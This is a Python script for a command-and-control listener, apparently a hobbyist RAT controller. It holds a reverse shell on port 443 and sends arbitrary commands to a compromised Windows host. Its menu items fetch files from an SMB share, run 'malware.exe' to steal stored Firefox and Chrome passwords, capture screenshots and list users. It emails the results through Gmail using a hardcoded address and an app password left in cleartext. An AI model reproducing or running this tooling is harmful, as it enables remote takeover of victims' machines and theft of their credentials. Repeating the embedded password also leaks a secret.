#!/usr/bin/env python3 

import signal
import socket
import smtplib
import sys
import re
import http.server
import socketserver
import time
from termcolor import colored
from colorama import Fore,Style
from email.mime.text import MIMEText


def def_handler(sig,frame):
  print(colored(f"\n\n[!] Saliendo...\n","red"))
  sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


class Listener:

  def __init__(self,ip,port):


    self.options = {"get users": "List system valid users (Gmail)","help": "Show this help pannel","get browser": "Get Firefox and Google Chrome Stored Passwords", "get screenshot": "Capture the actual window"}

    server_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    server_socket.bind((ip,port))
    server_socket.listen()

    print("\n"+Fore.YELLOW+"[+] "+Fore.WHITE+"Listening for incomming connections...")

    self.client_socket,client_address = server_socket.accept()

    print(Fore.YELLOW+"\n[+] "+ Fore.WHITE+"Connection established by: "+Fore.GREEN +str(client_address)+Fore.WHITE+"\n\n")


  def remote_execute(self,command):
    self.client_socket.send(command.encode())
    return self.client_socket.recv(8192).decode()



  def send_email(self,subject,body,sender,recipients,password):
    msg=MIMEText(body)
    msg['Subject'] = subject
    msg['From']= sender
    msg['To']= ', '.join(recipients)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
      smtp_server.login(sender,password)
      smtp_server.sendmail(sender,recipients,msg.as_string())

    print(f"\n[+] Email sent Successfully!\n")


  def get_users(self):
    self.client_socket.send(b"net user")
    output_command= self.client_socket.recv(2048).decode()

    self.send_email("Users Report - C2", output_command, "nockeylogger@gmail.com", ["nockeylogger@gmail.com"], "ezro xvah ctgy qhlt")


  def show_help(self):
    print("\n")
    for key,value in self.options.items():
      print(f"{key} - {value}")
    print("\n")


  def get_browser(self):
    self.remote_execute("copy \\\\192.168.1.164\\share .")
    self.remote_execute("malware.exe")
    print("\n[+] Email sent Succesfully!\n")


  def get_screenshot(self):
    self.remote_execute("copy \\\\192.168.1.164\\share .")
    self.remote_execute("nircmdc.exe savesreenshot \"sreenshot.png\"")




  def run(self):
    while True:
      command=input(Fore.GREEN+" $"+"NoC > "+Fore.WHITE)
      if command=="get users":
        self.get_users()
      elif command== "help":
        self.show_help()
      elif command=="get browser":
        self.get_browser()
      elif command=="get screenshot":
        self.get_screenshot()
      else:
        command_output = self.remote_execute(command)

        print(command_output)



if __name__=='__main__':
  my_listener= Listener("192.168.1.164", 443)
  my_listener.run()







